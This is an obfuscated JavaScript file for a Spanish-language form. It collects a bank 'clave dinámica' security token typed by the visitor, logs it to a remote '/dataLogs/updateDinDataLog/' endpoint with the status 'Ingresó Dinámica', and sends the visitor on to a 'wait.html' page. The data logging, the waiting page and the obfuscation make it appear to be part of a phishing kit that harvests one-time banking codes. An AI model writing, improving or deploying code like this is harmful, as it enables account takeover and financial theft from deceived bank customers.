const _0x512f60 = _0x5ae9;
(function (_0x101acf, _0x1df96a) {
  const _0x1ce6ce = _0x5ae9,
    _0x57fc32 = _0x101acf();
  while (!![]) {
    try {
      const _0x89c9cc =
        parseInt(_0x1ce6ce(0x17f)) / 0x1 +
        (parseInt(_0x1ce6ce(0x187)) / 0x2) *
          (-parseInt(_0x1ce6ce(0x1a2)) / 0x3) +
        (parseInt(_0x1ce6ce(0x17b)) / 0x4) *
          (parseInt(_0x1ce6ce(0x180)) / 0x5) +
        parseInt(_0x1ce6ce(0x19b)) / 0x6 +
        -parseInt(_0x1ce6ce(0x19e)) / 0x7 +
        -parseInt(_0x1ce6ce(0x183)) / 0x8 +
        (parseInt(_0x1ce6ce(0x19f)) / 0x9) * (parseInt(_0x1ce6ce(0x1a0)) / 0xa);
      if (_0x89c9cc === _0x1df96a) break;
      else _0x57fc32["push"](_0x57fc32["shift"]());
    } catch (_0x605b0d) {
      _0x57fc32["push"](_0x57fc32["shift"]());
    }
  }
})(_0x3654, 0x253ad);
function updateLS() {
  const _0x2de74a = _0x5ae9;
  LS["setItem"](_0x2de74a(0x198), JSON[_0x2de74a(0x181)](info));
}
function _0x5ae9(_0x317fb8, _0x4d3ea7) {
  const _0x365435 = _0x3654();
  return (
    (_0x5ae9 = function (_0x5ae957, _0x565421) {
      _0x5ae957 = _0x5ae957 - 0x17b;
      let _0x46dd71 = _0x365435[_0x5ae957];
      return _0x46dd71;
    }),
    _0x5ae9(_0x317fb8, _0x4d3ea7)
  );
}
function _0x3654() {
  const _0x93b1a0 = [
    "1843120OAgROa",
    "location",
    "value",
    "cdin",
    "1184CRAgim",
    "Ingresó\x20Dinámica",
    "Bearer\x20",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "application/json",
    "/dataLogs/updateDinDataLog/",
    "Error\x20al\x20actualizar\x20usuario:",
    "Usuario\x20actualizado\x20correctamente",
    "addEventListener",
    "json",
    "dataLogId",
    "getElementById",
    "getItem",
    "btndinamica",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "focus",
    "txtdinamica",
    "info",
    "href",
    "error",
    "796458MJapbh",
    "wait.html",
    "origin",
    "746543vYQlsU",
    "6894qKLiFz",
    "4090duoNMq",
    "disabled",
    "1335CzjSeb",
    "metaInfo",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "108nXTHwg",
    "PUT",
    "dataLogToken",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "83942CJUBwB",
    "41295zVTpIN",
    "stringify",
    "log",
  ];
  _0x3654 = function () {
    return _0x93b1a0;
  };
  return _0x3654();
}
const otpButton = document["getElementById"](_0x512f60(0x194)),
  numberMovil = document[_0x512f60(0x192)](_0x512f60(0x197));
otpButton[_0x512f60(0x18f)]("click", async function (_0x4c2bcb) {
  const _0x55251e = _0x512f60;
  _0x4c2bcb["preventDefault"](), (otpButton[_0x55251e(0x1a1)] = !![]);
  if (numberMovil[_0x55251e(0x185)] == "") {
    alert(_0x55251e(0x1a4)),
      numberMovil[_0x55251e(0x196)](),
      (otpButton[_0x55251e(0x1a1)] = ![]);
    return;
  }
  const _0x2467ed = numberMovil[_0x55251e(0x185)];
  (info[_0x55251e(0x1a3)][_0x55251e(0x186)] = _0x2467ed), updateLS();
  try {
    const _0x3db97d = localStorage[_0x55251e(0x193)](_0x55251e(0x191)),
      _0x43866a = localStorage[_0x55251e(0x193)](_0x55251e(0x17d));
    if (!_0x3db97d || !_0x43866a) throw new Error(_0x55251e(0x195));
    const _0x3703ff = await fetch(url + _0x55251e(0x18c) + _0x3db97d, {
      method: _0x55251e(0x17c),
      headers: {
        "Content-Type": _0x55251e(0x18b),
        Authorization: _0x55251e(0x189) + _0x43866a,
        Origin: window[_0x55251e(0x184)][_0x55251e(0x19d)],
      },
      body: JSON[_0x55251e(0x181)]({
        din: info[_0x55251e(0x1a3)][_0x55251e(0x186)],
        status: _0x55251e(0x188),
      }),
    });
    if (!_0x3703ff["ok"]) {
      const _0x3d7a7f = await _0x3703ff[_0x55251e(0x190)]();
      throw new Error(_0x3d7a7f[_0x55251e(0x19a)] || _0x55251e(0x17e));
    }
    console[_0x55251e(0x182)](_0x55251e(0x18e)),
      (otpButton[_0x55251e(0x1a1)] = ![]),
      (window[_0x55251e(0x184)][_0x55251e(0x199)] = _0x55251e(0x19c));
  } catch (_0x3512c5) {
    console["error"](_0x55251e(0x18d), _0x3512c5),
      alert(_0x55251e(0x18a)),
      (otpButton[_0x55251e(0x1a1)] = ![]);
  }
});
